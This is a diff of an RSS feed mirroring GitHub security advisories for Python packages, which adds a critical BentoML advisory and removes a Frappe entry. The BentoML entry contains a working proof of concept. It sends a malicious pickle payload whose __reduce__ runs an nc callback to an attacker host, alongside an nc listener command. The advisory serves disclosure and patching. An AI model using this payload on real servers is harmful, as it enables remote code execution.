@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-04-04T16:01:30.064Z</updated>
+    <updated>2025-04-04T17:01:28.872Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,109 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[bentoml] BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization]]></title>
+        <id>https://github.com/advisories/GHSA-33xw-247w-6hmc</id>
+        <link href="https://github.com/advisories/GHSA-33xw-247w-6hmc"/>
+        <updated>2025-04-04T16:05:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.</p>
+<h3 id="details">Details</h3>
+<p>It exists an unsafe code segment in <code>serde.py</code>: </p>
+<pre><code class="language-Python">def deserialize_value(self, payload: Payload) -&gt; t.Any:
+    if "buffer-lengths" not in payload.metadata:
+        return pickle.loads(b"".join(payload.data))
+</code></pre>
+<p>Through data flow analysis, it is confirmed that the <code>payload </code>content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.</p>
+<h3 id="poc">PoC</h3>
+<p>Environment:</p>
+<ul>
+<li>Server host:<ul>
+<li>IP: 10.98.36.123</li>
+<li>OS: Ubuntu</li>
+</ul>
+</li>
+<li>Attack host:<ul>
+<li>IP: 10.98.36.121</li>
+<li>OS: Ubuntu</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>Follow the instructions on the BentoML official README(<a href="https://github.com/bentoml/BentoML">https://github.com/bentoml/BentoML</a>) to set up the environment.</li>
+</ol>
+<p>1.1 Install BentoML (Server host: 10.98.36.123) :
+<code> pip install -U bentoml</code></p>
+<p>1.2 Define APIs in a <code>service.py</code> file (Server host: 10.98.36.123) :</p>
+<pre><code class="language-Python">from __future__ import annotations
+
+import bentoml
+
+@bentoml.service(
+    resources={"cpu": "4"}
+)
+class Summarization:
+    def __init__(self) -&gt; None:
+        import torch
+        from transformers import pipeline
+
+        device = "cuda" if torch.cuda.is_available() else "cpu"
+        self.pipeline = pipeline('summarization', device=device)
+
+    @bentoml.api(batchable=True)
+    def summarize(self, texts: list[str]) -&gt; list[str]:
+        results = self.pipeline(texts)
+        return [item['summary_text'] for item in results]
+</code></pre>
+<p>1.3 Run the service code (Server host: 10.98.36.123) :</p>
+<pre><code class="language-Bash">pip install torch transformers  # additional dependencies for local run
+
+bentoml serve
+</code></pre>
+<ol start="2">
+<li><p>Start nc listening on the attacking host (Attack host: 10.98.36.121) :
+<code>nc -lvvp 1234</code></p>
+</li>
+<li><p>Send maliciously crafted request (Attack host: 10.98.36.121) :</p>
+</li>
+</ol>
+<pre><code class="language-Python">import pickle
+import os
+import requests
+
+headers = {'Content-Type': 'application/vnd.bentoml+pickle'}
+
+class Evil:
+    def __reduce__(self):
+        return(os.system, ('nc 10.98.36.121 1234',))
+
+payload = pickle.dumps(Evil())
+
+requests.post("http://10.98.36.123:3000/summarize", data=payload, headers=headers)
+</code></pre>
+<ol start="4">
+<li>Attack success (Attack host: 10.98.36.121) :
+The server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.
+<img alt="nc" src="https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85"></li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Remote Code Execution (RCE).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc">https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27520">https://nvd.nist.gov/vuln/detail/CVE-2025-27520</a></li>
+<li><a href="https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194">https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194</a></li>
+<li><a href="https://github.com/advisories/GHSA-33xw-247w-6hmc">https://github.com/advisories/GHSA-33xw-247w-6hmc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-33xw-247w-6hmc</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-04-04T16:05:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[lmdeploy] LMDeploy Improper Input Validation Vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-7vc5-mjwp-c8fq</id>
@@ -704,31 +807,5 @@ We have identified a class pollution vulnerability in Mesop (&lt;= <a href="http
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-03-25T16:40:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[frappe] Frappe has Possibility of Remote Code Execution due to improper validation]]></title>
-        <id>https://github.com/advisories/GHSA-v342-4xr9-x3q3</id>
-        <link href="https://github.com/advisories/GHSA-v342-4xr9-x3q3"/>
-        <updated>2025-03-30T23:56:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A system user was able to create certain documents in a specific way that could lead to RCE.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There's no workaround, an upgrade is required.</p>
-<h3 id="credits">Credits</h3>
-<p>Thanks to Thanh of Calif.io for reporting the issue</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/frappe/frappe/security/advisories/GHSA-v342-4xr9-x3q3">https://github.com/frappe/frappe/security/advisories/GHSA-v342-4xr9-x3q3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30213">https://nvd.nist.gov/vuln/detail/CVE-2025-30213</a></li>
-<li><a href="https://github.com/advisories/GHSA-v342-4xr9-x3q3">https://github.com/advisories/GHSA-v342-4xr9-x3q3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v342-4xr9-x3q3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-25T16:39:25.000Z</published>
     </entry>
 </feed>
